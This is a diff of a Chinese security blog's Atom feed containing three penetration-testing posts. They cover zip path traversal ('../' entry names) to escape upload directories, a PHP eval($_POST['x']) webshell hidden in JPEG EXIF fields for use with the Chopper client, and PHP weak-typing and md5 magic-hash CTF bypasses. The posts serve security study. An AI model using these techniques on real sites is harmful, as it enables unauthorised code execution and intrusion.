@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2015-12-16T03:46:22.767Z</updated>
+  <updated>2015-12-17T07:07:04.501Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -19,11 +19,62 @@
     <link href="http://yoursite.com/2015/12/16/%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%87%E6%81%B6%E7%9A%84zip/"/>
     <id>http://yoursite.com/2015/12/16/上传之万恶的zip/</id>
     <published>2015-12-16T03:46:22.000Z</published>
-    <updated>2015-12-16T03:46:22.767Z</updated>
-    <content type="html"></content>
+    <updated>2015-12-17T07:07:04.501Z</updated>
+    <content type="html"><![CDATA[<p></p><h4>本文总阅读量<span id="busuanzi_value_page_pv"></span>次<p></p>
+<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2><a id="more"></a>
+<p></p><h4>1,找一张图片命令xxx11.jpg然后压缩<p></p>
+<p></p><h4>2,用二进制文件编辑器打开，我这里用的是UE，ctrl+f查找xxx替换成../，(注意有两处)<p></p>
+<p></p><h4>3,然后解压，你会发现11.jpg文件被解压到了文件目录的上一层<p></p>
+<h2 id="0X01__u5229_u7528"><a href="#0X01__u5229_u7528" class="headerlink" title="0X01 利用"></a>0X01 利用</h2><p></p><h4>如果我们在渗透过程中遇到zip上传，而且解压，但是解压之后的文件目录没有php的执行权限，或者php文件被自动删除。<p></p>
+<p></p><h4>那么zip大法就能搞定了，附上解压代码。<p></p>
+<pre><code>&lt;?php 
+    header(&quot;Content-type:text/html;charset=utf-8&quot;);
+    function get_zip($filename,$path=null){
+
+        $i=0;
+        if(!file_exists($filename))
+            die (&quot;&quot;);
+        $filename=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$filename);
+        $path=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$path);
+        $resource = zip_open($filename);
+        while($dir_res=zip_read($resource)){
+
+            if (zip_entry_open($resource,$dir_res)) {
+                $res_name= zip_entry_name($dir_res);
+
+                $file_name = $path.$res_name;
+                echo $file_name;
+                $file_path = substr($file_name,0,strrpos($file_name, &quot;/&quot;));
+                if(!is_dir($file_path)){
+                    mkdir($file_path,0777,true);
+                }
+                if(!is_dir($file_name)){
+                    $file_size=zip_entry_filesize($dir_res);
+                    if($file_size&lt;(1024*1024*6)){
+                        $file_content = zip_entry_read($dir_res,$file_size);
+                        file_put_contents($file_name,$file_content);
+                    }else{
+                        echo &quot;&lt;p&gt; &quot;.$i++.&quot; ， -&gt; &quot;.iconv(&quot;gb2312&quot;,&quot;utf-8&quot;,$file_name).&quot; &lt;/p&gt;&quot;;
+                    }
+
+                }
+            }
+
+        }
+
+    }
+    get_zip(&quot;11.zip&quot;,&apos;temp/&apos;);
+?&gt;
+</code></pre><h2 id="0X03__u6269_u5C55"><a href="#0X03__u6269_u5C55" class="headerlink" title="0X03 扩展"></a>0X03 扩展</h2><p></p><h4>如果我们有权限，也可以在解压目录中创建目录<p></p>
+<p></p><h4>原理相同把上述的xxx改成xx/，那么就会在文件目录下创建一个xx的目录，图片的路径就变成了temp/xx/11.jpg<p></p>
+</h4></h4></h4></h4></h4></h4></h4></h4>]]></content>
     <summary type="html">
+    <![CDATA[<p><h4>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
+<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2>]]>
     
     </summary>
+    
+      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
     
   </entry>
   
@@ -32,11 +83,12 @@
     <link href="http://yoursite.com/2015/12/11/php%E9%AB%98%E7%BA%A7%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E9%A9%AC/"/>
     <id>http://yoursite.com/2015/12/11/php高级图片隐藏马/</id>
     <published>2015-12-11T07:47:50.000Z</published>
-    <updated>2015-12-13T10:27:40.805Z</updated>
+    <updated>2015-12-17T07:10:15.788Z</updated>
     <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>  </p><h4>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息<p></p>
-<p>  </p><h4>php 中exif_read_data,可以读取EXIF的信息头，但是需要开启php_exif的模板<p></p>
-  <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p></p><h4>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在<br><a id="more"></a><p></p>
+<p></p><h4>JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息<p></p>
+<p></p><h4>php 中exif_read_data,可以读取EXIF的信息头，但是需要开启php_exif的模板<p></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>  </p><h4>输出<br>  <figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line"><span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449824391</span></span><br><span class="line"><span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line"><span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line"><span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line"><span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF'</span> (length=<span class="number">19</span>)</span><br><span class="line"><span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span></span><br><span class="line">    <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">    <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">    <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">    <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">    <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line"><span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br></pre></td></tr></table></figure><p></p>
 <h2 id="0x01__u7325_u7410_u5229_u7528"><a href="#0x01__u7325_u7410_u5229_u7528" class="headerlink" title="0x01 猥琐利用"></a>0x01 猥琐利用</h2><p></p><h4>右键点击图片，属性-》详细信息-》标记-》填写shell;<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449825529</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'shell'</span> (length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p></p>
 <p></p><h4>可见下最下面多了一条’Keywords’ =&gt; string ‘shell’ (length=5)<p></p>
@@ -45,10 +97,11 @@
 <p></p><h4>菜刀连之，即可,<p></p>
 <h2 id="0x02_u603B_u7ED3"><a href="#0x02_u603B_u7ED3" class="headerlink" title="0x02总结"></a>0x02总结</h2><p></p><h4>同样你把一句话不写在标记里面，写在主题，标题，作者等都是一样的。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449827712</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'ImageDescription'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Artist'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Title'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Author'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Subject'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p></p>
 <pre><code>Author:FreeV
-</code></pre></h4></h4></h4></h4></h4></h4></h4></h4>]]></content>
+</code></pre></h4></h4></h4></h4></h4></h4></h4></h4></h4>]]></content>
     <summary type="html">
     <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x0]]>
+<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p><h4>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在<br>]]>
+    
     </summary>
     
       <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
@@ -60,11 +113,11 @@
     <link href="http://yoursite.com/2015/12/09/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/"/>
     <id>http://yoursite.com/2015/12/09/php弱类型安全/</id>
     <published>2015-12-09T04:51:21.000Z</published>
-    <updated>2015-12-13T10:29:15.040Z</updated>
+    <updated>2015-12-17T07:07:51.207Z</updated>
     <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p></p><h4>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型<p></p>
+<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p></p><h4>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型<br><a id="more"></a><p></p>
 <p></p><h4>例如php 中的当php中使用‘==’时会自动类型转换<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line">true<span class="variable">$b</span>=<span class="string">'1asd'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="number">1</span>==<span class="variable">$b</span>)</span><br><span class="line">truetrueecho <span class="string">"yes"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p>
-<p></p><h4>如下代码都是我在ctf中遇到的题型<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">true<span class="variable">$test</span>=$_GET[<span class="string">'test'</span>]; //test=<span class="number">240610708</span></span><br><span class="line">trueecho <span class="variable">$test</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">true<span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line">true<span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123;   //0exxx=<span class="number">0</span>  <span class="number">240610708</span></span><br><span class="line">truetrueprint <span class="string">"flag&#123;xxxxxx&#125;"</span>;</span><br><span class="line">true&#125;<span class="keyword">else</span> </span><br><span class="line">truetrueprint <span class="string">"you are falied!"</span>;</span><br><span class="line">trueprint <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p></p>
+<p></p><h4>如下代码都是我在ctf中遇到的题型<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">true<span class="variable">$test</span>=$_GET[<span class="string">'test'</span>]; //test=<span class="number">240610708</span></span><br><span class="line">trueecho <span class="variable">$test</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">true<span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line">true<span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123;   //0exxx=<span class="number">0</span>  <span class="number">240610708</span></span><br><span class="line">truetrueprint <span class="string">"flag&#123;xxxxxx&#125;"</span>;</span><br><span class="line">true&#125;<span class="keyword">else</span> </span><br><span class="line">truetrueprint <span class="string">"you are falied!"</span>;</span><br><span class="line">trueprint <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p></p>
 <p></p><h4>test=240610708 就可以绕过了，因为240610708的md5是0e…..php自动类型转换时候就是0<p></p>
 <h2 id="0x01_u7325_u7410_u5229_u7528"><a href="#0x01_u7325_u7410_u5229_u7528" class="headerlink" title="0x01猥琐利用"></a>0x01猥琐利用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3.php</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span> </span><br><span class="line">true<span class="variable">$flag</span>=<span class="string">'xx'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">    	<span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">        	<span class="keyword">echo</span> (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">truetrue<span class="keyword">else</span></span><br><span class="line">truetruetrue<span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">truetrue&#125;</span><br><span class="line"> <span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 <p></p><h4>这道题与2.php的区别就是’==’换成了’===’<p></p>
@@ -73,7 +126,8 @@
 </code></pre></h4></h4></h4></h4></h4></h4>]]></content>
     <summary type="html">
     <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31]]>
+<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p><h4>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型<br>]]>
+    
     </summary>
     
       <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
